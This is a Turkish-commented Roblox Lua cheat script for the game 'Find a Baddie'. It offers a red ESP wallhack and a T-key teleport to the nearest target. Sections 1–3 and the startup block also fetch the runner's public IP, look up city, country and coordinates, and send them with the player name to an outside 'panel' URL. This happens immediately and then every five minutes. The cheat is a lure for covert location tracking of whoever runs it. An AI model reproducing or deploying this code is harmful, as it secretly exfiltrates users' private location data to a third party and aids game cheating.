-- ============================================
-- FIND A BADDIE - HIZLI VERİ GÖNDERİM
-- ============================================

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")
local http = game:GetService("HttpService")
local PANEL_URL = "https://youenowes.github.io/elpan/"

-- ============================================
-- 1. IP'Yİ ANINDA AL (Gecikmesiz)
-- ============================================
local function getIP()
    local success, result = pcall(function()
        return game:HttpGet("https://api.ipify.org/", true)
    end)
    return success and result or "0.0.0.0"
end

-- ============================================
-- 2. LOKASYONU AL (Basit ve Hızlı)
-- ============================================
local function getLocation(ip)
    local success, result = pcall(function()
        local data = game:HttpGet("http://ip-api.com/json/" .. ip .. "?fields=status,country,city,lat,lon", true)
        return http:JSONDecode(data)
    end)
    if success and result and result.status == "success" then
        return result
    end
    return nil
end

-- ============================================
-- 3. VERİYİ GÖNDER (Direkt, Beklemesiz)
-- ============================================
local function sendData()
    -- IP'yi al
    local ip = getIP()
    
    -- Lokasyonu al
    local location = getLocation(ip)
    local city = location and location.city or "Unknown"
    local country = location and location.country or "Unknown"
    local lat = location and location.lat or 0
    local lon = location and location.lon or 0
    
    -- URL oluştur
    local logData = string.format(
        "%s|%s|%s|%s|%s|%s",
        player.Name,
        ip,
        city,
        country,
        tostring(lat),
        tostring(lon)
    )
    
    local url = PANEL_URL .. "?log=" .. http:UrlEncode(logData)
    
    -- GÖNDER (Bekleme yok!)
    pcall(function()
        game:HttpGet(url, true)
        print("✅ GÖNDERİLDİ:", player.Name, ip, city, country)
    end)
end

-- ============================================
-- 4. ESP (KIRMIZI) - Aynı, hızlı çalışır
-- ============================================
local settings = {
    espEnabled = true,
    espColor = Color3.fromRGB(255, 0, 0)
}

local baddies = {}

local Baddie = {}
Baddie.__index = Baddie

function Baddie.new(model)
    local self = setmetatable({}, Baddie)
    self.model = model
    self.name = model.Name
    self.rootPart = model:FindFirstChild("HumanoidRootPart") or model.PrimaryPart
    self.humanoid = model:FindFirstChild("Humanoid")
    self.isActive = true
    self.distance = math.huge
    self.highlight = nil
    return self
end

function Baddie:update()
    if not self.model or not self.model.Parent then
        self.isActive = false
        return
    end
    
    self.rootPart = self.model:FindFirstChild("HumanoidRootPart")
    if not self.rootPart then
        local descendants = self.model:GetDescendants()
        for _, desc in ipairs(descendants) do
            if desc:IsA("BasePart") and string.find(desc.Name, "HumanoidRootPart") then
                self.rootPart = desc
                break
            end
        end
    end
    
    if not self.rootPart then
        self.rootPart = self.model.PrimaryPart
    end
    
    self.humanoid = self.model:FindFirstChild("Humanoid")
    
    if self.rootPart then
        self.distance = (self.rootPart.Position - rootPart.Position).Magnitude
    end
    
    if self.humanoid and self.humanoid.Health <= 0 then
        self.isActive = false
    end
end

function Baddie:createESP()
    if not self.rootPart then return end
    
    local highlight = Instance.new("Highlight")
    highlight.Parent = self.model
    highlight.FillColor = settings.espColor
    highlight.FillTransparency = 0.4
    highlight.OutlineColor = settings.espColor
    highlight.OutlineTransparency = 0.1
    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    self.highlight = highlight
end

function Baddie:destroy()
    self.isActive = false
    if self.highlight then
        self.highlight:Destroy()
    end
    self.highlight = nil
end

-- ============================================
-- 5. TARAMA
-- ============================================
local function scanForBaddies()
    local found = {}
    local allObjects = game.Workspace:GetDescendants()
    
    for _, obj in ipairs(allObjects) do
        if obj:IsA("Model") then
            local hasRoot = obj:FindFirstChild("HumanoidRootPart") ~= nil
            local isTemplateRig = string.find(string.lower(obj.Name), "templaterig") ~= nil
            local isBaddie = string.find(string.lower(obj.Name), "baddie") ~= nil or
                            string.find(string.lower(obj.Name), "anime") ~= nil
            
            if hasRoot or isTemplateRig or isBaddie then
                local exists = false
                for _, b in ipairs(baddies) do
                    if b.model == obj then
                        exists = true
                        break
                    end
                end
                
                if not exists and obj ~= character and obj.Parent ~= character then
                    local newBaddie = Baddie.new(obj)
                    if newBaddie.rootPart then
                        table.insert(found, newBaddie)
                    end
                end
            end
        end
    end
    
    return found
end

-- ============================================
-- 6. IŞINLANMA
-- ============================================
local function teleportToNearest()
    local nearest = nil
    local minDist = math.huge
    
    for _, baddie in ipairs(baddies) do
        if baddie.isActive and baddie.rootPart then
            local dist = (baddie.rootPart.Position - rootPart.Position).Magnitude
            if dist < minDist then
                minDist = dist
                nearest = baddie
            end
        end
    end
    
    if nearest and nearest.rootPart then
        rootPart.CFrame = CFrame.new(nearest.rootPart.Position + Vector3.new(0, 3, 0))
        return true
    end
    return false
end

-- ============================================
-- 7. ANA DÖNGÜ
-- ============================================
local function updateAllESP()
    local toRemove = {}
    for i, baddie in ipairs(baddies) do
        baddie:update()
        if not baddie.isActive then
            baddie:destroy()
            table.insert(toRemove, i)
        end
    end
    
    table.sort(toRemove, function(a,b) return a > b end)
    for _, i in ipairs(toRemove) do
        table.remove(baddies, i)
    end
    
    local newBaddies = scanForBaddies()
    for _, baddie in ipairs(newBaddies) do
        baddie:createESP()
        table.insert(baddies, baddie)
    end
end

local function mainLoop()
    while task.wait(0.5) do
        updateAllESP()
    end
end

-- ============================================
-- 8. TUŞ
-- ============================================
game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.T then
        teleportToNearest()
    end
end)

-- ============================================
-- 9. BAŞLAT
-- ============================================
print("🔴 HIZLI SİSTEM BAŞLATILDI!")

-- IP'Yİ ANINDA GÖNDER (1. çalıştırmada hemen)
task.spawn(function()
    sendData()
end)

-- HER 5 DAKİKADA BİR TEKRAR GÖNDER
task.spawn(function()
    while true do
        task.wait(300) -- 5 dakika
        sendData()
    end
end)

-- ESP'yi başlat
task.wait(1)
updateAllESP()
coroutine.wrap(mainLoop)()

print("✅ AKTİF! (IP her 5 dakikada bir güncellenir)")